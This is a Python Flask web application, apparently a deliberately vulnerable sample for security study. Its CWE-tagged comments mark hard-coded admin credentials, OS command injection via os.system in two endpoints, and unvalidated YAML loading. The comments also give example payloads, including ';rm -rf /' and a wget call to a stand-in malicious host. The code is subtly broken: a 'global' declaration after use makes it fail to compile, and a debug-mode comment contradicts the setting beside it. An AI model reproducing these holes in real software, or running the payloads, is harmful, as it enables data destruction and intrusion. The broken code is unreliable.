from flask import Flask, request, jsonify
import os
import yaml

app = Flask(__name__)

# CWE-798: Use of Hard-coded Credentials
# Hardcoded password allows an attacker who can read the source code to gain admin access.
ADMIN_PASSWORD = "admin1234"

@app.route('/data/upload', methods=['POST'])
def upload_data():
    yaml_data = request.data.decode('utf-8')
    try:
        # CWE-20: Improper Input Validation
        # YAML data is parsed without validation. Malicious YAML could lead to security issues, although yaml.FullLoader is safer than yaml.Loader.
        data_info = yaml.load(yaml_data, Loader=yaml.FullLoader)
    except yaml.YAMLError:
        return jsonify({"status": "Error", "message": "Invalid YAML format"}), 400

    data_id = data_info.get('data_id', '')
    data_value = data_info.get('data_value', '')

    if not data_id or not data_value:
        return jsonify({"status": "Error", "message": "Missing data information"}), 400

    return jsonify({"status": "Data uploaded", "data_id": data_id, "data_value": data_value})

@app.route('/task/execute', methods=['GET'])
def execute_task():
    task = request.args.get('task', '')
    parameter = request.args.get('parameter', '')
    # CWE-78: OS Command Injection
    # User input is directly used in an OS command without sanitization, allowing arbitrary command execution.
    # Example Payload: `task=;rm -rf /` or `parameter=;wget http://malicious.example.com`
    os.system(f"sh execute_task.sh {task} {parameter}")
    return jsonify({"status": "Task execution started"})

@app.route('/admin/login', methods=['POST'])
def login():
    password = request.form.get('password', '')

    # CWE-287: Improper Authentication
    # Comparison against a hardcoded password without rate limiting or account lockout mechanisms.
    if password == ADMIN_PASSWORD:
        return jsonify({"status": "Access granted"})
    else:
        return jsonify({"status": "Access denied"}), 401

@app.route('/admin/configure', methods=['POST'])
def configure():
    password = request.form.get('password', '')

    # CWE-285: Improper Authorization
    # Password check is the only authorization control; no user roles or permissions considered.
    if password != ADMIN_PASSWORD:
        return jsonify({"status": "Access denied"}), 401
    
    new_config = request.form.get('new_config', '')
    if not new_config:
        return jsonify({"status": "Error", "message": "Invalid configuration"}), 400

    return jsonify({"status": "Configuration updated", "new_config": new_config})

@app.route('/data/retrieve', methods=['GET'])
def retrieve_data():
    data_id = request.args.get('data_id', '')
    if not data_id:
        return jsonify({"status": "Error", "message": "Data ID is required"}), 400

    data_info = {
        "data_id": data_id,
        "data_value": "Sample Value"
    }

    return jsonify({"status": "Data retrieved", "data_info": data_info})

@app.route('/data/delete', methods=['POST'])
def delete_data():
    data_id = request.form.get('data_id', '')
    if not data_id:
        return jsonify({"status": "Error", "message": "Data ID is required"}), 400

    return jsonify({"status": "Data deleted", "data_id": data_id})

@app.route('/admin/change_password', methods=['POST'])
def change_password():
    old_password = request.form.get('old_password', '')
    new_password = request.form.get('new_password', '')

    # CWE-287: Improper Authentication
    # Password change functionality does not verify if the new password meets security policies (e.g., complexity, length).
    if old_password == ADMIN_PASSWORD:
        global ADMIN_PASSWORD
        ADMIN_PASSWORD = new_password
        return jsonify({"status": "Password changed successfully"})
    else:
        return jsonify({"status": "Access denied", "message": "Invalid old password"}), 401

@app.route('/task/status', methods=['GET'])
def task_status():
    task_id = request.args.get('task_id', '')
    if not task_id:
        return jsonify({"status": "Error", "message": "Task ID is required"}), 400

    return jsonify({"status": "Task status", "task_id": task_id, "status": "Running"})

@app.route('/admin/settings', methods=['POST'])
def admin_settings():
    password = request.form.get('password', '')
    
    if password != ADMIN_PASSWORD:
        return jsonify({"status": "Access denied"}), 401
    
    new_setting = request.form.get('new_setting', '')
    if not new_setting:
        return jsonify({"status": "Error", "message": "Invalid setting"}), 400

    return jsonify({"status": "Setting applied", "new_setting": new_setting})

@app.route('/task/logs', methods=['GET'])
def task_logs():
    task_id = request.args.get('task_id', '')
    if not task_id:
        return jsonify({"status": "Error", "message": "Task ID is required"}), 400

    # CWE-200: Information Exposure
    # Logs are directly included in the response, potentially exposing sensitive information.
    logs = "Sample logs for task " + task_id

    return jsonify({"status": "Task logs", "task_id": task_id, "logs": logs})

@app.route('/data/export', methods=['GET'])
def export_data():
    export_format = request.args.get('format', 'csv')
    # CWE-78: OS Command Injection
    # User-controlled input is passed to an OS command, allowing for arbitrary command execution.
    # Example Payload: `format=;rm -rf /`
    os.system(f"python3 export_data.py {export_format}")
    return jsonify({"status": "Data export started"})

@app.route('/user/profile', methods=['GET'])
def user_profile():
    user_id = request.args.get('user_id', '')
    if not user_id:
        return jsonify({"status": "Error", "message": "User ID is required"}), 400

    profile = {
        "user_id": user_id,
        "name": "John Doe",
        "email": "john.doe@example.com"
    }

    return jsonify({"status": "User profile", "profile": profile})

# CWE-489: Leftover Debug Code
# Running the application in debug mode can expose sensitive information and should be disabled in production.
app.run(debug=False)